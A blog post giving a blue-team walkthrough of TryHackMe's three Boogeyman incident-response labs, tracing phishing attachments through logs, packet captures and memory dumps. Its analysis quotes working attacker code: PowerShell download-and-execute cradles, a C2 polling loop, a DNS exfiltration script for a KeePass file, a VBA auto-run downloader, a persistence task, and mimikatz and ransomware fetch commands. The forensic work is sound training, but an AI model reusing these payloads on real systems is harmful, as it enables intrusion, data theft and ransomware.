---
title: "THM: Boogeyman (All)"
date: 2025-01-04
categories: [CTF, Blue Team]
tags: [CTF, Blue Team]
permalink: /posts/ctf-blueteam-all-boogeyman
image:
  path: /assets/img/thumbnails/ctf-blueteam-boogeyman.png
---


### Walkthrough

#### **CTF Platform**: TryHackMe  
#### **Level**: Medium

#### **Tools Used:**

- **Impacket**: For SMB server setup and file transfer.
- **Wireshark/Tshark**: For network traffic analysis.
- **jq**: For parsing JSON logs.
- **PowerShell**: For decoding and analyzing malicious scripts.
- **KeePass/KPCLI**: For decrypting KeePass databases.
- **Base64**: For decoding file contents.
- **lnkparse**: For analyzing Windows shortcut files.
- **SQLite3**: For reading Sticky Notes databases.
- **Volatility**: For memory forensics and process analysis.
- **Didier Stevens Suite (oledump.py)**: For analyzing malicious Office documents.
- **dnSpy**: For decompiling .NET executables.
- **Elasticsearch**: For querying logs.
- **PowerView.ps1**: For enumerating domain resources.
- **Invoke-ShareFinder**: For discovering shared resources and credentials.
- **Mimikatz**: For credential dumping and Pass-the-Hash attacks.


#### **Resources Used:**

- Boogeyman 1: [TryHackMe](https://tryhackme.com/room/boogeyman1)
- Boogeyman 2: [TryHackMe](https://tryhackme.com/room/boogeyman2)
- Boogeyman 3: [TryHackMe](https://tryhackme.com/room/boogeyman3)
- PowerShell Event Logs
- PCAP File Analysis
- Malicious Attachment Analysis
- Memory Dump Analysis
- Elasticsearch Logs



## Boogeyman 1

---

### Background

Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.

---

### Exfiltration

#### Setting Up SMB Server
To exfiltrate artifacts:
```bash
$ impacket-smbserver <NAME> . -smb2support
```

#### Zipping Artifacts
From the Ubuntu machine:
```bash
ubuntu@tryhackme:~$ cd Desktop
ubuntu@tryhackme:~/Desktop$ zip -r artefacts.zip artefacts/*  
  [..omitted..]
ubuntu@tryhackme:~/Desktop$ smbclient //<IP>/<NAME> -c 'put artefacts.zip' -N
```

#### Extracting Artifacts
On the host machine:
```bash
$ unzip artefacts.zip
$ ls artefacts
  capture.pcapng  dump.eml  evtx2json  powershell.evtx  powershell.json
```

---

### PowerShell Events

Analyzing PowerShell event logs:
```bash
$ cat powershell.json | jq -r '.EventID' | sort | uniq -c | sort -bnr
    939 4104
     44 4100
      2 53504
      1 40962
      1 40961
```

---

### Protocol Hierarchy

Analyzing protocol usage:
```bash
$ tshark -r capture.pcapng | sed -e 's/^[ ]*\w*\s*//g' | sed -E 's/\s{2,}/ /g' | cut -d' ' -f5 | sort | uniq -c | sort -bnr
  38769 TCP
   3422 TLSv1.3
   2060 QUIC
   1989 HTTP
   1229 DNS
   1084 TLSv1.2
     82 SSDP
     77 TLSv1
     74 ARP
     14 UDP
     12 NBNS
     10 MDNS
      7 HTTP/XML
      5 SSLv2
      5 IGMPv3
      5 ICMPv6
      5 ICMP
      5 BROWSER
      2 LLMNR
      2 DHCP
```

---

### Email Analysis

The security team flagged the suspicious execution of the attachment, indicating a targeted attack on the finance team. The TTP used is attributed to the new threat group named **Boogeyman**, known for targeting the logistics sector.

#### Exchange Information
The email was sent by Arthur Griffin (`agriffin@bpakcaging.xyz`) to Julianne Westcott (`julianne.westcott@hotmail.com`):
```plaintext
From: Arthur Griffin <agriffin@bpakcaging.xyz>
Date: Fri, 13 Jan 2023 09:25:26 +0000
Subject: Collection for Quick Logistics LLC - Jan 2023
Message-Id: <4uiwqc5wd1qx.HPk2p-JE_jYbkWIRB-SmuA2@tracking.bpakcaging.xyz>
Reply-To: Arthur Griffin <agriffin@bpakcaging.xyz>
Sender: agriffin@bpakcaging.xyz
To: Julianne Westcott <julianne.westcott@hotmail.com>
```

#### Security Headers
Both SPF and DMARC passed, showing no email spoofing. DKIM checks detected two signatures:
```plaintext
Authentication-Results: spf=pass (sender IP is 15.235.99.80)
 smtp.mailfrom=bpakcaging.xyz; dkim=pass (signature was verified)
 header.d=bpakcaging.xyz;dmarc=bestguesspass action=none
 header.from=bpakcaging.xyz;compauth=pass reason=109
Received-SPF: Pass (protection.outlook.com: domain of bpakcaging.xyz
 designates 15.235.99.80 as permitted sender) receiver=protection.outlook.com;
 client-ip=15.235.99.80; helo=pa80.mxout.mta1.net; pr=C
DKIM-Signature: v=1; a=rsa-sha256; d=bpakcaging.xyz; s=api; c=relaxed/simple;
	t=1673601926; h=from:date:subject:reply-to:to:list-unsubscribe:mime-version;
	bh=DORzQK4K9VXO5g47mYpyX7cPagIyvAX1RLfbY0szvCc=;
	b=dCB9MhhsZqg4h2P9dg5zMjLj7HVS9vt0fXuqEzH8cj6ft+YBJxvZHkF8uc+CeOas6CoICaPu13Q
	oL/xVebg3aO8bmlooJWTAZx7mmrh/1ZQBVHm3wvGVI9Xn55nhWzRGoqVOAAPPM6+MEHFwZDIjKDAs
	RpDurrnykQeCXCp127k=
DKIM-Signature: v=1; a=rsa-sha256; d=elasticemail.com; s=api;
	c=relaxed/simple; t=1673601926;
	h=from:date:subject:reply-to:to:list-unsubscribe;
	bh=DORzQK4K9VXO5g47mYpyX7cPagIyvAX1RLfbY0szvCc=;
	b=jcC3z+U5lVQUJEYRyQ76Z+xaJMrXN2YdjyM8pUl7hgXesQaY7rqSORNRWynpDQ3/CBSllw31eDq
	WmoqpFqj2uVy5RXK73lkBEHs5ju1eH/4svHpZLS9+wU/tO5dfZVUImvY32iinpJCtoiMLjdpKYMA/
	d5BBGqluALtqy9fZQzM=
```

#### Email Body
The email contained an encrypted attachment with the password `Invoice2023!`.

#### Email Attachment
A ZIP file, `Invoice.zip`, was attached to the email. Extracting its contents:
```bash
$ cat Invoice.zip_b64 | tr -d '
' | base64 -d > Invoice.zip
$ file Invoice.zip          
  Invoice.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
$ unzip Invoice.zip  
  Archive:  Invoice.zip
  [Invoice.zip] Invoice_20230103.lnk password: Invoice2023!
  zsh: suspended  unzip Invoice.zip
```

Examining `Invoice_20230103.lnk`:
```bash
$ lnkparse Invoice_20230103.lnk 
  Windows Shortcut Information:
     Link CLSID: 00021401-0000-0000-C000-000000000046
     Link Flags: HasTargetIDList | HasName | HasRelativePath | HasWorkingDir | HasArguments | HasIconLocation | IsUnicode | HasExpIcon - (16637)
     File Flags:  - (0)
     Creation Timestamp: None
     Modified Timestamp: None
     Accessed Timestamp: None
     Icon Index: 0 
     Window Style: SW_SHOWMINNOACTIVE 
     HotKey: CONTROL - C {0x4302} 
     TARGETS:
        Index: 78
        ITEMS:
           Root Folder
              Sort index: My Computer
              Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
           Volume Item
              Flags: 0xf
              Data: None
           File entry
              Flags: Is directory
              Modification time: None
              File attribute flags: 16
              Primary name: Windows
           File entry
              Flags: Is directory
              Modification time: None
              File attribute flags: 16
              Primary name: System32
           File entry
              Flags: Is directory
              Modification time: None
              File attribute flags: 16
              Primary name: WindowsPowerShell
           File entry
              Flags: Is directory
              Modification time: None
              File attribute flags: 16
              Primary name: v1.0
           File entry
              Flags: Is file
              Modification time: None
              File attribute flags: 0
              Primary name: powershell.exe
     DATA
        Description: Invoice Jan 2023
        Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Working directory: C:
        Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
        Icon location: C:\Users\Administrator\Desktop\excel.ico
     EXTRA BLOCKS:
        ICON_LOCATION_BLOCK
           Target ansi: %USERPROFILE%\Desktop\excel.ico
           Target unicode: %USERPROFILE%\Desktop\excel.ico
        SPECIAL_FOLDER_LOCATION_BLOCK
           Special folder id: 37
        KNOWN_FOLDER_LOCATION_BLOCK
           Known folder id: 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7
        METADATA_PROPERTIES_BLOCK
           Version: 0x53505331
           Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE
```

The encoded PowerShell command downloads and executes a payload:
```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

---

### Log Analysis

#### Timestamp Fix
Sorting JSON logs by timestamp:
```bash
$ cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' > powershell1.json
```

#### PowerShell Logs
Analyzing executions:
```bash
$ cat powershell1.json | grep 4104 | jq '.ScriptBlockText' | grep -v Set-StrictMode
```

##### Initial Execution
Downloading `update`:
```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

##### Establishing C2 Connection
```powershell
$s='cdn.bpakcaging.xyz:8080';$i='8cce49b0-b86459bb-27fe2489';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{"X-38d2-8f49"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/b86459bb -Headers @{"X-38d2-8f49"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST -Headers @{"X-38d2-8f49"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```

##### Seatbelt Execution
Locating sensitive files:
```powershell
cd Users;pwd
cd j.westcott;pwd
ps;pwd
iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd
cd Public;pwd
cd Music;pwd
iwr http://files.bpakcaging.xyz/sb.exe -outfile sb.exe;pwd
.\\sb.exe all;pwd
.\\sb.exe system;pwd
.\\sb.exe;pwd
.\\sb.exe -group=all;pwd
Seatbelt.exe -group=user;pwd
.\\sb.exe -group=user;pwd
ls C:\\Users\\j.westcott\\Documents\\protected_data.kdbx;pwd
```

##### KeePass Database Exfiltration
Exfiltrating via DNS:
```powershell
$file='protected_data.kdbx'; 
$destination = "167.71.211.113"; 
$bytes = [System.IO.File]::ReadAllBytes($file);
split-path $pwd'\\0x00';
$file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'; 
$destination = "167.71.211.113"; 
$bytes = [System.IO.File]::ReadAllBytes($file);
$hex = ($bytes|ForEach-Object ToString X2) -join '';
$split = $hex -split '(\\S{50})'; 
ForEach ($line in $split) { 
    nslookup -q=A "$line.bpakcaging.xyz" $destination;
} 
echo "Done";
```

---

### Network Analysis

#### HTTP Traffic
Identifying servers:
```bash
$ tshark -r capture.pcapng -Y 'http.response_for.uri contains "bpakcaging.xyz" and http' -T json | jq -r '.[]."_source".layers.http | with_entries(if (.key|test("http.(server)")) then ({key: "server", value: .value}) else empty end) | .server' | sort | uniq -c | sort -nr
    929 Apache/2.4.1 
      3 SimpleHTTP/0.6 Python/3.10.7
```

#### Command Executions
Decoding POST data:
```bash
$ tshark -r capture.pcapng -Y 'http.request.full_uri contains "/27fe2489" and http' -T json| jq -r '.[]."_source".layers.http | with_entries(if (.key|test("http.file_data")) then ({key: "data", value: .value}) else empty end) | .data' | head -n1
  13 13 10 13 10 80 97 116 104 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 45 45 45 45 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 13 10 67 58 92 87 105 110 100 111 119 115 92 115 121 115 116 101 109 51 50 13 10 13 10 13 10
```

Converting to ASCII:
```bash
$ for i in $(cat c2.data); do for x in $i; do hex=$(printf '%x' $x); echo -ne "\x$hex"; done; done
```

---

### DNS Exfiltration

Reconstructing the KeePass database:
```bash
$ tshark -r capture.pcapng -Y "ip.dst==167.71.211.113 and dns" -T fields -e dns.qry.name | grep -E '[A-F0-9]+.bpakcaging.xyz$' | cut -d'.' -f1 | tr -d '
' | xxd -p -r > protected_data.kdbx
$ file protected_data.kdbx 
  protected_data.kdbx: Keepass password database 2.x KDBX
```

Opening the KeePass database:
```bash
$ kpcli --kdb=protected_data.kdbx 
Provide the master password: *************************
kpcli:/> dir
  === Groups ===
  protected_data/
kpcli:/> cd protected_data
kpcli:/protected_data> dir
  === Groups ===
  eMail/
  General/
  Homebanking/
  Internet/
  Network/
  Recycle Bin/
  Windows/
kpcli:/protected_data> cd Homebanking
kpcli:/protected_data/Homebanking> dir
  === Entries ===
  0. Company Card                                                           
kpcli:/protected_data/Homebanking> show 0
  Title: Company Card
  Uname: 
   Pass: 
    URL: 
  Notes: 
  String Values: 
           1) Account Number = 4024007128269551
           2) CVV = 970
           3) Expiration Date = 3/2028
           4) Name = Quick Logistics LLC
```


## Boogeyman 2

---

### Background

Maxine, a Human Resource Specialist working for Quick Logistics LLC, received an application from one of the open positions in the company. Unbeknownst to her, the attached resume was malicious and compromised her workstation.

---

### Exfiltration

#### Setting Up Python HTTP Server
To exfiltrate artifacts:
```bash
$ cd Desktop/Artefacts/
$ python3 -m http.server
```

#### Downloading Artifacts
From the host machine:
```bash
$ wget http://<THM_IP>:8000/<filename>
```

---

### Email Analysis

#### Email Header
The email was sent by Wesley Taylor (`westaylor23@outlook.com`) to Maxine Beck (`maxine.beck@quicklogisticsorg.onmicrosoft.com`):
```plaintext
From: "westaylor23@outlook.com" <westaylor23@outlook.com>
To: "maxine.beck@quicklogisticsorg.onmicrosoft.com"
Content-Type: application/msword; name="Resume_WesleyTaylor.doc"
```

#### Email Attachment
A `.doc` file was attached to the email. Extracting its contents:
```bash
$ cat Resume\ -\ Application\ for\ Junior\ IT\ Analyst\ Role.eml | grep -i -E '^[A-Z0-9+/=]{32,76}' | tr -d '\r' | base64 -d > Resume_WesleyTaylor.doc
$ file Resume_WesleyTaylor.doc
  Resume_WesleyTaylor.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252
```

#### Analyzing the Malicious Macro
Using `oledump.py` to analyze macros:
```bash
$ python3 ./git/DidierStevensSuite/oledump.py ./CTF/THM/Boogeyman2/Resume_WesleyTaylor.doc
    1:       114 '\x01CompObj'
    2:      4096 '\x05DocumentSummaryInformation'
    3:      4096 '\x05SummaryInformation'
    4:      7288 '1Table'
    5:     28574 'Data'
    6:       414 'Macros/PROJECT'
    7:        71 'Macros/PROJECTwm'
    8: M    2027 'Macros/VBA/NewMacros'
    9: m     962 'Macros/VBA/ThisDocument'
   10:      2787 'Macros/VBA/_VBA_PROJECT'
   11:      2242 'Macros/VBA/__SRP_0'
   12:       122 'Macros/VBA/__SRP_1'
   13:       935 'Macros/VBA/__SRP_2'
   14:       156 'Macros/VBA/__SRP_3'
   15:       570 'Macros/VBA/dir'
   16:      4096 'WordDocument'
```

The macro downloads a file (`update.png`) and saves it as `update.js`, then executes it via `wscript.exe`:
```vb
Attribute VB_Name = "NewMacros"
Sub AutoOpen()
spath = "C:\ProgramData\"
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png", False
xHttp.Send
With bStrm
    .Type = 1
    .Open
    .write xHttp.responseBody
    .savetofile spath & "\update.js", 2
End With
Set shell_object = CreateObject("WScript.Shell")
shell_object.Exec ("wscript.exe C:\ProgramData\update.js")
End Sub
```

---

### Memory Analysis

#### Identifying Processes
Using Volatility to identify suspicious processes:
```bash
$ python2 vol.py -f $THM/Boogeyman2/WKSTN-2961.raw --profile=Win10x64_18362 pstree | grep -C2 -i wscript
  .... 0xffffe58f81150080:WINWORD.EXE                  1124   1440     18      0 2023-08-21 14:12:31 UTC+0000
  ..... 0xffffe58f864ca0c0:wscript.exe                 4260   1124      6      0 2023-08-21 14:12:47 UTC+0000
  ...... 0xffffe58f87ac0080:updater.exe                6216   4260     18      0 2023-08-21 14:12:48 UTC+0000
```

#### Extracting `updater.exe`
Dumping `updater.exe` from memory:
```bash
$ python2 vol.py -f $THM/Boogeyman2/WKSTN-2961.raw --profile=Win10x64_18362 procdump -D $THM/Boogeyman2/volatility -p 6216
$ file executable.6216.exe
  executable.6216.exe: PE32+ executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
```

Decompiling with `dnSpy` reveals that `updater.exe` is an Empire stager compiled via Sharpire and calls back to `128.199.95.189:8080`.

---

### Persistence Mechanism

#### Scheduled Task Creation
Extracting process memory of `updater.exe`:
```bash
$ python2 vol.py -f $THM/Boogeyman2/WKSTN-2961.raw --profile=Win10x64_18362 memdump -p 6216 -D $THM/Boogeyman2/volatility
```

Strings reveal a scheduled task named `Updater`:
```bash
$ strings -el 6216.dmp | grep -i "powershell.exe "
  "C:\Windows\system32\schtasks.exe" /Create /F /SC DAILY /ST 09:00 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\""
```

#### Extracting Task Configuration
Extracting the XML configuration of the scheduled task:
```bash
$ python3 vol.py -f $THM/Boogeyman2/WKSTN-2961.raw filescan | grep -i 'System32\\Tasks\\'
$ python3 vol.py -f $THM/Boogeyman2/WKSTN-2961.raw windows.dumpfiles --virtaddr 0xe58f89295990
```

XML confirms the task runs a PowerShell command:
```xml
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
    <Actions Context="Author">
        <Exec>
            <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
            <Arguments>-NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))"</Arguments>
        </Exec>
    </Actions>
</Task>
```

#### Decoding Base64 Payload
Extracting the encoded payload from the registry:
```bash
$ strings -el registry.0xffff9582f2681000.ntuserdat.reg | grep -i -E '[a-z0-9\+\/=]{100,}' | base64 -d
```

The decoded payload is another Empire stager calling back to `128.199.95.189:8080`.

---

### Network Analysis

#### C2 Communication
Analyzing connections using Volatility:
```bash
$ python2 vol.py -f $THM/Boogeyman2/WKSTN-2961.raw --profile=Win10x64_18362 netscan | grep -C2 updater.exe
  0xe58f86b73010     TCPv4    10.10.49.181:63308             128.199.95.189:8080  CLOSED           -1                      3884-06-06 01:06:33 UTC+0000
```



## Boogeyman 3

---

### Background

Without tripping any security defenses of Quick Logistics LLC, the Boogeyman compromised an employee's email access and waited in the shadows for the right moment to escalate the attack. Using this initial foothold, the threat actors targeted the CEO, Evan Hutchinson, expanding their impact on the organization.

---

### Incident Timeline

| Timestamp           | Event                                                                 |
|---------------------|-----------------------------------------------------------------------|
| 2023-08-30 01:31:39 | Pass-the-Hash using the Domain Administrator on WKSTN-1327.           |
| 2023-08-30 01:45:41 | Execution of Empire stager on DC01 from WKSTN-0051.                   |
| 2023-08-30 01:46:18 | Download of `mimikatz.exe` on DC01.                                   |
| 2023-08-30 01:47:57 | DCSync attack on the Domain Administrator user (`backupda`).          |
| 2023-08-30 01:53:13 | Download of `ransomboogey.exe` on DC01.                               |
| 2023-08-30 01:53:33 | Execution of `ransomboogey.exe` on DC01 by Administrator.             |
| 2023-08-30 01:56:40 | Last download of `ransomboogey.exe` on WKSTN-1327.                    |
| 2023-08-30 01:59:36 | First download of `ransomboogey.exe` on WKSTN-0051.                   |
| 2023-08-30 02:06:09 | Empire stager execution as Domain Admin on WKSTN-0051.                |
| 2023-08-30 02:06:25 | Empire stager execution as Domain Admin on WKSTN-1327.                |
| 2023-08-30 02:07:22 | Execution of `ransomboogey.exe` on WKSTN-1327 by `itadmin`.            |

---

### Artifacts

#### Exfiltration
Using Elasticsearch to analyze logs:
```bash
$ curl -d "$(cat query.json)" -H 'Content-Type: application/json' -s http://elastic:elastic@<ELASTIC_IP>:9200/winlogbeat-7.17.6-2023.08.29-000001/_search?size=3000 | jq -c '.hits.hits[]."_source"' | grep command_line | jq -r '"\(."@timestamp") \(.user.name)\t\(.process.pid)\t\(.process.parent.pid)\t\(.process.command_line)"' | sort
```

#### Ransomware Execution
The ransomware `ransomboogey.exe` was downloaded and executed across multiple endpoints:
```bash
$ curl -d "$(cat query.json)" -H 'Content-Type: application/json' -s http://elastic:elastic@<ELASTIC_IP>:9200/winlogbeat-7.17.6-2023.08.29-000001/_search?size=3000 | jq -c '.hits.hits[]."_source"' | grep command_line | jq -r '"\(."@timestamp") \(.user.name)@\(.host.hostname)\t\(.process.pid)\t\(.process.parent.pid)\t\(.process.command_line)"' | sort | grep ransomboogey.exe
```

---

### Attack Vectors

#### Initial Compromise
The attacker used an HTA file (`ProjectFinancialSummary_Q3.pdf.hta`) to execute malicious code:
```plaintext
2023-08-29T23:51:15.856Z evan.hutchinson	6392	2940	"C:\Windows\SysWOW64\mshta.exe" "D:\ProjectFinancialSummary_Q3.pdf.hta"
```

This spawned three processes:
```plaintext
2023-08-29T23:51:16.738Z evan.hutchinson	3832	6392	"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat
2023-08-29T23:51:16.771Z evan.hutchinson	3680	6392	"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer
```

#### Empire Stager
The Empire stager was executed on multiple endpoints and communicated with `cdn.bananapeelparty.net:80` or `165.232.170.151:80`:
```bash
$ cat query_net.json
{
  "query": {
    "bool": {
      "must": { "term": { "process.pid": "6160" } },
      "should": [{ "match": { "event.category": "network" } }],
      "filter": { "range": { "@timestamp": { "gte": "2023-08-29T00:00:00", "lte": "2023-08-31T00:00:00" } } }
    }
  },
  "_source": ["@timestamp", "host.hostname", "source.ip", "source.port", "destination.ip", "destination.port"]
}
```

---

### Credential Harvesting

#### Mimikatz Execution
The attacker downloaded and executed `mimikatz.exe` to dump credentials:
```plaintext
2023-08-30T01:46:18 evan.hutchinson	<mimikatz_pid>	<parent_pid>	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iwr http://ff.sillytechninja.io/mimikatz.exe -outfile mimikatz.exe; .\mimikatz.exe"
```

#### Pass-the-Hash
Using the dumped credentials, the attacker performed a Pass-the-Hash attack:
```plaintext
2023-08-30T01:31:39 Pass-the-Hash using the Domain Administrator on WKSTN-1327.
```

---

### Lateral Movement

#### Invoke-Command
The attacker used `Invoke-Command` to execute commands remotely on other endpoints:
```powershell
Invoke-Command -ComputerName WKSTN-1327.quicklogistics.org -ScriptBlock { iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe; .\ransomboogey.exe }
```

#### Shared Resource Discovery
Using `Invoke-ShareFinder`, the attacker discovered credentials for `allan.smith` in a file named `IT_Automation.ps1`:
```plaintext
2023-08-30T01:56:05.018Z Administrator@DC01	4296	4008	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "Invoke-Command -ComputerName WKSTN-1327.quicklogistics.org -ScriptBlock { ... }"
```

---

### Ransomware Deployment

#### Download and Execution
The ransomware `ransomboogey.exe` was downloaded and executed on multiple endpoints:
```plaintext
2023-08-30T01:53:13.738Z Administrator@DC01	4308	4008	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe"
2023-08-30T01:53:33.815Z Administrator@DC01	5572	4008	"C:\Users\Administrator\ransomboogey.exe"
```

---

### Log Analysis

#### Querying Elasticsearch
To analyze process creation logs:
```bash
$ curl -d "$(cat query.json)" -H 'Content-Type: application/json' -s http://elastic:elastic@<ELASTIC_IP>:9200/winlogbeat-7.17.6-2023.08.29-000001/_search?size=10000 | jq -r '.hits.hits[]."_source".user.name' | sort | uniq -c | sort -nr
```

#### Endpoint Activity
Endpoints with the most activity:
```plaintext
5695 WKSTN-0051
2174 DC01
2131 WKSTN-1327
```
